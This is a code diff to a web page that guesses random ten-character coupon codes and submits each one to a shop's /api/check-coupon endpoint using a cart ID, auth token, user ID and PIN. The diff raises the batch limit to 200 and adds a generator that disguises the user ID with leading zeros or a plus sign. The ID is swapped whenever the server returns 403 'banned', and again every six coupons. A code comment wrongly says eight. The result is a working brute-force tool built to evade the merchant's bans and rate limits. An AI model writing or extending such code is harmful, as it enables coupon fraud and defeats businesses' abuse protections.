@@ -30,7 +30,7 @@
       </div>
       <div class="col-md-6">
         <label class="form-label">How many coupons to test?</label>
-        <input type="number" class="form-control" id="count" value="5" min="1" max="50">
+        <input type="number" class="form-control" id="count" value="10" min="1" max="200">
       </div>
       <div class="col-md-6">
         <label class="form-label">Prefix (optional)</label>
@@ -43,70 +43,93 @@
 
     <!-- Results Table -->
     <div class="card shadow-sm">
-      <div class="card-body">
-        <h4>Results</h4>
-        <table class="table table-bordered table-striped">
-          <thead>
-            <tr>
-              <th>Coupon</th>
-              <th>Status</th>
-              <th>Message</th>
-            </tr>
-          </thead>
-          <tbody id="resultTable"></tbody>
-        </table>
-      </div>
+  <div class="card-body">
+    <h4>Results</h4>
+    <div style="max-height: 400px; overflow-y: auto;">
+      <table class="table table-bordered table-striped">
+        <thead class="table-light sticky-top">
+          <tr>
+            <th>Coupon</th>
+            <th>Status</th>
+            <th>Message</th>
+            <th>Using User ID</th>
+          </tr>
+        </thead>
+        <tbody id="resultTable"></tbody>
+      </table>
     </div>
   </div>
+</div>
 
 <script>
-  // Generate unique 10-char coupon (digit/letter alternating)
+  // ------------------------------
+  // Coupon Generator
+  // ------------------------------
   function generateCoupon(prefixInput = "") {
     const digits = "0123456789";
     const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
 
     let code = (prefixInput || "").toUpperCase();
-
-    // Enforce strict max length = 10
     if (code.length > 10) code = code.slice(0, 10);
 
-    // Determine what should come next
     let nextShouldBeDigit;
     if (code.length === 0) {
-      nextShouldBeDigit = true; // start with digit
+      nextShouldBeDigit = true;
     } else {
       const lastChar = code[code.length - 1];
-      nextShouldBeDigit = isNaN(lastChar); // if last is letter → next is digit
+      nextShouldBeDigit = isNaN(lastChar);
     }
 
     while (code.length < 10) {
       if (nextShouldBeDigit) {
-        const digit = digits[Math.floor(Math.random() * digits.length)];
-        code += digit;
+        code += digits[Math.floor(Math.random() * digits.length)];
       } else {
-        const letter = letters[Math.floor(Math.random() * letters.length)];
-        code += letter;
+        code += letters[Math.floor(Math.random() * letters.length)];
       }
       nextShouldBeDigit = !nextShouldBeDigit;
     }
-
     return code;
   }
 
+  // ------------------------------
+  // User ID Rotation Manager
+  // ------------------------------
+  function* userIdGenerator(baseUserId) {
+    // First phase: prepend up to 127 zeros
+    for (let i = 1; i <= 127; i++) {
+      yield "0".repeat(i) + baseUserId;
+    }
+    // Second phase: prepend + with up to 125 zeros
+    for (let i = 1; i <= 125; i++) {
+      yield "+" + "0".repeat(i) + baseUserId;
+    }
+  }
+
+  // ------------------------------
+  // Helpers
+  // ------------------------------
   const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
+  // ------------------------------
+  // Main Script
+  // ------------------------------
   document.getElementById("configForm").addEventListener("submit", async (e) => {
     e.preventDefault();
 
     const cartId = document.getElementById("cartId").value;
     const authToken = document.getElementById("authToken").value;
-    const userId = document.getElementById("userId").value;
+    const baseUserId = document.getElementById("userId").value;
     const pin = document.getElementById("pin").value;
     const count = parseInt(document.getElementById("count").value);
     const prefix = document.getElementById("prefix").value.trim();
 
     const tableBody = document.getElementById("resultTable");
     tableBody.innerHTML = "";
+
+    // User ID rotation
+    const userIds = userIdGenerator(baseUserId);
+    let currentUserId = baseUserId;
+    let couponCounter = 0;
 
     for (let i = 0; i < count; i++) {
       const coupon = generateCoupon(prefix);
@@ -116,6 +139,7 @@
         <td>${coupon}</td>
         <td>⏳ Checking...</td>
         <td></td>
+        <td>${currentUserId}</td>
       `;
       tableBody.appendChild(row);
 
@@ -123,17 +147,27 @@
         const res = await fetch("/api/check-coupon", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ coupon, cartId, authToken, userId, pin }),
+          body: JSON.stringify({ coupon, cartId, authToken, userId: currentUserId, pin }),
         });
+
+        if (res.status === 403) {
+          // 🚨 Banned → switch immediately
+          const nextId = userIds.next();
+          if (!nextId.done) {
+            currentUserId = nextId.value;
+            console.warn("⚠️ 403 detected → switched User ID to:", currentUserId);
+          }
+          i--; // retry same coupon with new userId
+          row.remove();
+          continue;
+        }
 
         const data = await res.json();
 
         if (data.result?.status === "success" || data.result?.result?.[0]?.applicable) {
           row.cells[1].innerHTML = "✅ Valid";
           row.cells[2].innerHTML = "Discount applied!";
-          
           tableBody.insertBefore(row, tableBody.firstChild);
-
           row.className = "table-success";
         } else {
           row.cells[1].innerHTML = "❌ Invalid";
@@ -146,7 +180,18 @@
         row.className = "table-warning";
       }
 
-      // Wait 10s before next request
+      couponCounter++;
+
+      // 🔄 Rotate User ID every 8 coupons
+      if (couponCounter % 6 === 0) {
+        const nextId = userIds.next();
+        if (!nextId.done) {
+          currentUserId = nextId.value;
+          console.log("🔄 Switched User ID to:", currentUserId);
+        }
+      }
+
+      // Wait 10s unless we’re switching due to 403
       if (i < count - 1) {
         await sleep(10000);
       }
